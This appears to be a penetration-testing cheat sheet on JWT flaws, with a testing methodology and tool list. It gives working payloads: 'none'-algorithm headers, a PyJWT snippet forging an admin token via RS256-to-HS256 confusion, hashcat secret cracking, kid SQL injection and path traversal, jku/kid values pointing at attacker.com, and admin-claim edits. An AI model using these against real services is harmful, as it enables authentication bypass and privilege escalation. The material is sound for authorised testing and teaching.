# JWT (JSON Web Token) Vulnerabilities

## Overview
JWT implementation flaws that allow token forgery, privilege escalation, and authentication bypass.

## JWT Structure
```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

## Algorithm Confusion Attacks

### None Algorithm
```
# Change alg to "none", remove signature
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# Craft token: base64(header).base64(payload).
# Note: trailing dot required
```

### RS256 → HS256 Confusion
```
# If server uses RS256, public key is known
# Switch alg to HS256, sign with public key as HMAC secret
# Server may verify with public key as HMAC key

import jwt, requests
public_key = open('public.pem').read()
forged = jwt.encode({"sub":"admin","role":"admin"}, public_key, algorithm='HS256')
```

### ECDSA Key Confusion
```
# Similar to RS256 → HS256 but with ES256 → HS256
```

## Weak Secret Brute Force
```
# Common secrets
secret, password, 123456, jwt_secret, your-256-bit-secret

# Hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt

# jwt-cracker
jwt-cracker <token> [alphabet] [maxLength]
```

## Key Injection (kid / jku / x5u)

### kid Header Injection
```
# kid = key ID, used to select verification key
# SQL injection in kid
{"kid": "' UNION SELECT 'attacker_secret' -- "}
# Server queries: SELECT key FROM keys WHERE id='...'

# Path traversal in kid
{"kid": "../../dev/null"}  # sign with empty string
{"kid": "../../proc/self/fd/0"}

# kid pointing to attacker-controlled content
{"kid": "https://attacker.com/key.pem"}
```

### jku Header Injection
```
# jku = JWK Set URL, server fetches keys from this URL
{"jku": "https://attacker.com/jwks.json"}

# Host attacker JWKS with your own key pair
# Sign token with your private key, server fetches your public key

# SSRF via jku
{"jku": "https://internal-service/keys"}
```

### x5u / x5c Header Injection
```
# x5u: URL pointing to X.509 certificate
# x5c: X.509 certificate chain directly in header
# Similar to jku — inject attacker-controlled certificate
```

## Payload Manipulation
```
# Decode payload (base64 decode)
echo "eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ" | base64 -d

# Common payload fields to modify
{"sub": "admin"}          # change user ID
{"role": "admin"}         # privilege escalation  
{"email": "admin@x.com"}
{"isAdmin": true}
{"exp": 9999999999}       # extend expiry
{"nbf": 0}                # not before = epoch
```

## Expiry Bypass
```
# exp not validated
# exp in the past still accepted
# nbf in the future accepted
# iat manipulation

# Test: modify exp to past date and see if still accepted
```

## Signature Validation Bypass
```
# Empty signature accepted
header.payload.
header.payload

# Tampered payload with valid-looking signature
# Copy signature from another valid token

# If signature checked only on some fields
```

## Testing Methodology
1. Capture a valid JWT
2. Decode header + payload (jwt.io or manual base64)
3. Test none algorithm attack
4. Test alg confusion (RS256→HS256 if RSA used)
5. Brute force secret (if HS256)
6. Check kid/jku/x5u headers for injection
7. Modify payload claims (role, sub, admin)
8. Test expiry manipulation
9. Look for JWT in: cookies, Authorization header, local storage, URL params

## Tools
- jwt.io — decode/encode
- `jwt_tool` — comprehensive JWT attack suite
- `hashcat -m 16500` — HMAC secret brute force
- Burp Suite JWT Editor extension
- `python-jwt`, `PyJWT` for crafting tokens
